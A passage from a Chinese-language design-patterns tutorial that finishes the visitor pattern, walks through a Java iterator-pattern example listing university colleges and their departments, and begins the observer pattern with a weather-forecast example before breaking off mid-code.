访问者模式的注意事项和细节</h2><ol><li><p>优点</p><ul><li><p>访问者模式符合单一职责原则、让程序具有优秀的扩展性、灵活性非常高</p></li><li><p>访问者模式可以对功能进行统一，可以做报表、UI、拦截器与过滤器，适用于数据结构相对稳定的系统</p></li></ul></li><li><p>缺点</p></li></ol><ul><li><p>具体元素对访问者公布细节，也就是说访问者关注了其他类的内部细节，这是迪米特法则所不建议的, 这样造成了具体元素变更比较困难</p></li><li><p>违背了依赖倒转原则。访问者依赖的是具体元素，而不是抽象元素</p></li><li><p>因此，<strong>如果一个系统有比较稳定的数据结构</strong>，又有经常变化的功能需求，那么<strong>访问者模式就是比较合适</strong>的</p></li></ul><h1 id="迭代器模式"><a class="markdownIt-Anchor" href="#迭代器模式"></a> <mark>迭代器模式</mark></h1><p>迭代器模式（Iterator Pattern）是 Java 和 .Net 编程环境中非常常用的设计模式。这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。</p><p>迭代器模式属于行为型模式。</p><h2 id="介绍-15"><a class="markdownIt-Anchor" href="#介绍-15"></a> 介绍</h2><p><strong>意图：</strong> 提供一种方法顺序访问一个聚合对象中各个元素, 而又无须暴露该对象的内部表示。</p><p><strong>主要解决：</strong> 不同的方式来遍历整个整合对象。</p><p><strong>何时使用：</strong> 遍历一个聚合对象。</p><p><strong>如何解决：</strong> 把在元素之间游走的责任交给迭代器，而不是聚合对象。</p><p><strong>关键代码：</strong> 定义接口：hasNext, next。</p><p><strong>应用实例：</strong> JAVA 中的 iterator。</p><p><strong>优点：</strong> 1、它支持以不同的方式遍历一个聚合对象。 2、迭代器简化了聚合类。 3、在同一个聚合上可以有多个遍历。<br />4、在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。</p><p><strong>缺点：</strong> 由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。</p><p><strong>使用场景：</strong> 1、访问一个聚合对象的内容而无须暴露它的内部表示。 2、需要为聚合对象提供多种遍历方式。 3、为遍历不同的聚合结构提供一个统一的接口。</p><p><strong>注意事项：</strong><br />迭代器模式就是分离了集合对象的遍历行为，抽象出一个迭代器类来负责，这样既可以做到不暴露集合的内部结构，又可让外部代码透明地访问集合内部的数据。</p><h2 id="实现-13"><a class="markdownIt-Anchor" href="#实现-13"></a> 实现</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103201406957.png" alt="image-20230103201406957" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 相当于一个大学</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        List&lt;College&gt; collegeList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;College&gt;();<br><br>        <span class="hljs-comment">//创建学院</span><br>        <span class="hljs-type">ComputerCollege</span> <span class="hljs-variable">computerCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollege</span>();<br>        <span class="hljs-type">InfoCollege</span> <span class="hljs-variable">infoCollege</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoCollege</span>();<br><br>        collegeList.add(computerCollege);<br>        collegeList.add(infoCollege);<br><br>        <span class="hljs-type">OutPutImpl</span> <span class="hljs-variable">outPutImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutPutImpl</span>(collegeList);<br>        outPutImpl.printCollege();<br><br>    &#125;<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>College.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">College</span> &#123;<br>   <br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//增加系的方法</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span>;<br>   <br>   <span class="hljs-comment">//返回一个迭代器,遍历</span><br>   <span class="hljs-keyword">public</span> Iterator  <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">numOfDepartment</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> ;<span class="hljs-comment">// 保存当前数组的对象个数</span><br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollege</span><span class="hljs-params">()</span> &#123;<br>      departments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>[<span class="hljs-number">5</span>];<br>      addDepartment(<span class="hljs-string">&quot;Java专业&quot;</span>, <span class="hljs-string">&quot; Java专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;PHP专业&quot;</span>, <span class="hljs-string">&quot; PHP专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;大数据专业&quot;</span>, <span class="hljs-string">&quot; 大数据专业 &quot;</span>);<br>      <br>   &#125;<br>   <br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;计算机学院&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departments[numOfDepartment] = department;<br>      numOfDepartment += <span class="hljs-number">1</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComputerCollegeIterator</span>(departments);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ComputerCollegeIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputerCollegeIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br>   <span class="hljs-comment">//这里我们需要Department 是以怎样的方式存放=&gt;数组</span><br>   Department[] departments;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//遍历的位置</span><br>   <br>   <br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ComputerCollegeIterator</span><span class="hljs-params">(Department[] departments)</span> &#123;<br>      <span class="hljs-built_in">this</span>.departments = departments;<br>   &#125;<br><br>   <span class="hljs-comment">//判断是否还有下一个元素</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(position &gt;= departments.length || departments[position] == <span class="hljs-literal">null</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<span class="hljs-keyword">else</span> &#123;<br>      <br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> departments[position];<br>      position += <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">return</span> department;<br>   &#125;<br>   <br>   <span class="hljs-comment">//删除的方法，默认空实现</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br>      <br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Department.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-comment">//系</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Department</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String desc;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Department</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> desc;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDesc</span><span class="hljs-params">(String desc)</span> &#123;<br>        <span class="hljs-built_in">this</span>.desc = desc;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoColleageIterator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoColleageIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Iterator</span> &#123;<br><br><br>    List&lt;Department&gt; departmentList; <span class="hljs-comment">// 信息工程学院是以List方式存放系</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<span class="hljs-comment">//索引</span><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoColleageIterator</span><span class="hljs-params">(List&lt;Department&gt; departmentList)</span> &#123;<br>        <span class="hljs-built_in">this</span>.departmentList = departmentList;<br>    &#125;<br><br>    <span class="hljs-comment">//判断list中还有没有下一个元素</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">if</span> (index &gt;= departmentList.size() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            index += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-keyword">return</span> departmentList.get(index);<br>    &#125;<br><br>    <span class="hljs-comment">//空实现remove</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>InfoCollege.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InfoCollege</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">College</span> &#123;<br><br>   List&lt;Department&gt; departmentList;<br>   <br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">InfoCollege</span><span class="hljs-params">()</span> &#123;<br>      departmentList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Department&gt;();<br>      addDepartment(<span class="hljs-string">&quot;信息安全专业&quot;</span>, <span class="hljs-string">&quot; 信息安全专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;网络安全专业&quot;</span>, <span class="hljs-string">&quot; 网络安全专业 &quot;</span>);<br>      addDepartment(<span class="hljs-string">&quot;服务器安全专业&quot;</span>, <span class="hljs-string">&quot; 服务器安全专业 &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;信息工程学院&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addDepartment</span><span class="hljs-params">(String name, String desc)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Department</span> <span class="hljs-variable">department</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(name, desc);<br>      departmentList.add(department);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Iterator <span class="hljs-title function_">createIterator</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InfoColleageIterator</span>(departmentList);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OutPutImpl.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.iterator;<br><br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OutPutImpl</span> &#123;<br>   <br>   <span class="hljs-comment">//学院集合</span><br>   List&lt;College&gt; collegeList;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OutPutImpl</span><span class="hljs-params">(List&lt;College&gt; collegeList)</span> &#123;<br>      <br>      <span class="hljs-built_in">this</span>.collegeList = collegeList;<br>   &#125;<br>   <span class="hljs-comment">//遍历所有学院,然后调用printDepartment 输出各个学院的系</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCollege</span><span class="hljs-params">()</span> &#123;<br>      <br>      <span class="hljs-comment">//从collegeList 取出所有学院, Java 中的 List 已经实现Iterator</span><br>      Iterator&lt;College&gt; iterator = collegeList.iterator();<br>      <br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-comment">//取出一个学院</span><br>         <span class="hljs-type">College</span> <span class="hljs-variable">college</span> <span class="hljs-operator">=</span> iterator.next();<br>         System.out.println(<span class="hljs-string">&quot;=== &quot;</span>+college.getName() +<span class="hljs-string">&quot;=====&quot;</span> );<br>         printDepartment(college.createIterator()); <span class="hljs-comment">//得到对应迭代器</span><br>      &#125;<br>   &#125;<br>   <br>   <br>   <span class="hljs-comment">//输出 学院输出 系</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printDepartment</span><span class="hljs-params">(Iterator iterator)</span> &#123;<br>      <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;<br>         <span class="hljs-type">Department</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (Department)iterator.next();<br>         System.out.println(d.getName());<br>      &#125;<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">=== 计算机学院=====</span><br>Java专业<br>PHP专业<br>大数据专业<br><span class="hljs-section">=== 信息工程学院=====</span><br>信息安全专业<br>网络安全专业<br>服务器安全专业<br></code></pre></td></tr></table></figure><h2 id="迭代器模式的注意事项和细节"><a class="markdownIt-Anchor" href="#迭代器模式的注意事项和细节"></a> 迭代器模式的注意事项和细节</h2><ol><li>优点</li></ol><ul><li><p>提供一个统一的方法遍历对象，客户不用再考虑聚合的类型，使用一种方法就可以遍历对象了。</p></li><li><p>隐藏了聚合的内部结构，客户端要遍历聚合的时候只能取到迭代器，而不会知道聚合的具体组成。</p></li><li><p>提供了一种<strong>设计思想</strong>，就是一个类应该只有一个引起变化的原因（叫做单一责任原则）。在聚合类中，我们把迭代器分开，就是要把<strong>管理对象集合</strong>和<strong>遍历对象集合</strong>的责任分开，这样一来集合改变的话，只影响到聚合对象。而如果遍历方式改变的话，只影响到了迭代器。</p></li><li><p>当要展示一组相似对象，或者遍历一组相同对象时使用, 适合使用迭代器模式</p></li></ul><ol start="2"><li>缺点<ul><li>每个聚合对象都要一个迭代器，会生成多个迭代器不好管理类</li></ul></li></ol><h1 id="观察者模式"><a class="markdownIt-Anchor" href="#观察者模式"></a> <mark>观察者模式</mark></h1><p>当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知依赖它的对象。观察者模式属于行为型模式。</p><h2 id="介绍-16"><a class="markdownIt-Anchor" href="#介绍-16"></a> 介绍</h2><p><strong>意图：</strong> 定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。</p><p><strong>主要解决：</strong> 一个对象状态改变给其他对象通知的问题，而且要考虑到易用和低耦合，保证高度的协作。</p><p><strong>何时使用：</strong> 一个对象（目标对象）的状态发生改变，所有的依赖对象（观察者对象）都将得到通知，进行广播通知。</p><p><strong>如何解决：</strong> 使用面向对象技术，可以将这种依赖关系弱化。</p><p><strong>关键代码：</strong> 在抽象类里有一个 ArrayList 存放观察者们。</p><p><strong>应用实例：</strong> 1、拍卖的时候，拍卖师观察最高标价，然后通知给其他竞价者竞价。<br />2、西游记里面悟空请求菩萨降服红孩儿，菩萨洒了一地水招来一个老乌龟，这个乌龟就是观察者，他观察菩萨洒水这个动作。</p><p><strong>优点：</strong> 1、观察者和被观察者是抽象耦合的。 2、建立一套触发机制。</p><p><strong>缺点：</strong> 1、如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。2、如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。3、观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。</p><p><strong>使用场景：</strong></p><ul><li>一个抽象模型有两个方面，其中一个方面依赖于另一个方面。将这些方面封装在独立的对象中使它们可以各自独立地改变和复用。</li><li>一个对象的改变将导致其他一个或多个对象也发生改变，而不知道具体有多少对象将发生改变，可以降低对象之间的耦合度。</li><li>一个对象必须通知其他对象，而并不知道这些对象是谁。</li><li>需要在系统中创建一个触发链，A对象的行为将影响B对象，B对象的行为将影响C对象……，可以使用观察者模式创建一种链式触发机制。</li></ul><p><strong>注意事项：</strong> 1、JAVA 中已经有了对观察者模式的支持类。 2、避免循环引用。 3、如果顺序执行，某一观察者错误会导致系统卡壳，一般采用异步方式。</p><h2 id="实现-14"><a class="markdownIt-Anchor" href="#实现-14"></a> 实现</h2><h3 id="天气预报设计方案-1-普通方案"><a class="markdownIt-Anchor" href="#天气预报设计方案-1-普通方案"></a> 天气预报设计方案 1-普通方案</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104142333771.png" alt="image-20230104142333771" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.observer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//创建接入方 currentConditions</span><br>      <span class="hljs-type">CurrentConditions</span> <span class="hljs-variable">currentConditions</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 